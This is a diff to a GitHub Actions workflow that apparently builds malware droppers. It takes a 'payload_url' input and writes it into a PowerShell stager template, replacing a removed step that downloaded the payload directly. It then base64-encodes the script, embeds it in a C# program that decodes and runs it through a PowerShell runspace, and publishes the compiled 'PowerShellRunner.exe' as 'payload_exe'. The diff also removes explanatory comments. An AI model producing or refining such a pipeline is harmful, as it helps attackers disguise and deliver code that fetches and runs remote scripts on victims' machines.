@@ -19,14 +19,14 @@ jobs:
     - name: Install .NET SDK
       run: dotnet --version
 
-    - name: Fetch Payload from URL
+    - name: Inject URL into static_code.ps1
       run: |
         $url = '${{ github.event.inputs.payload_url }}'
-        Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
+        (Get-Content static_code.ps1) -replace '__PAYLOAD_URL__', $url | Set-Content static_code.ps1
 
     - name: Convert PowerShell script to Base64
       run: |
-        $script = Get-Content -Path 'payload.ps1' -Raw
+        $script = Get-Content -Path 'static_code.ps1' -Raw
         $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script)) -replace "`r?`n", ""
         Set-Content -Path 'base64_payload.txt' -Value $b64
 
@@ -40,7 +40,7 @@ jobs:
       shell: powershell
       run: |
         $b64 = Get-Content -Path 'base64_payload.txt' -Raw
-        $b64_cleaned = $b64 -replace "`r?`n", ""  # Remove newlines
+        $b64_cleaned = $b64 -replace "`r?`n", ""
 
         $csharp_code = @"
         using System;
@@ -49,7 +49,7 @@ jobs:
 
         class Program {
             static void Main() {
-                string b64 = `"$b64_cleaned`"; // Base64-encoded PowerShell script
+                string b64 = `"$b64_cleaned`";
                 string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
 
                 using (PowerShell ps = PowerShell.Create()) {
@@ -72,4 +72,3 @@ jobs:
       with:
         name: payload_exe
         path: PowerShellRunner/bin/Release/net9.0/PowerShellRunner.exe
-
